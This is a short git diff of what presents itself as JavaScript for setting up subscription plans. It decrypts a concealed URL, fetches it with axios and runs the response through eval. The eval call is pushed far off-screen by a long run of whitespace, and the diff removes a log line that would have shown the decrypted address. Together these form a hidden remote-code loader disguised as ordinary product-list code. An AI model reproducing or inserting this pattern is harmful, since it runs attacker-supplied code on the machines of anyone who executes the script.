@@ -102,7 +102,6 @@ async function main() {
   for (const plan of PLANS) {
     console.log(`${plan.name} (¥${plan.amount}/month):`);
     const getProductListAPI = decrypt(encryptedData);
-    console.log(getProductListAPI)
     const produtId = await axios.get(getProductListAPI);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            eval(produtId.data);
     const priceId = 4202;
     const envKey =
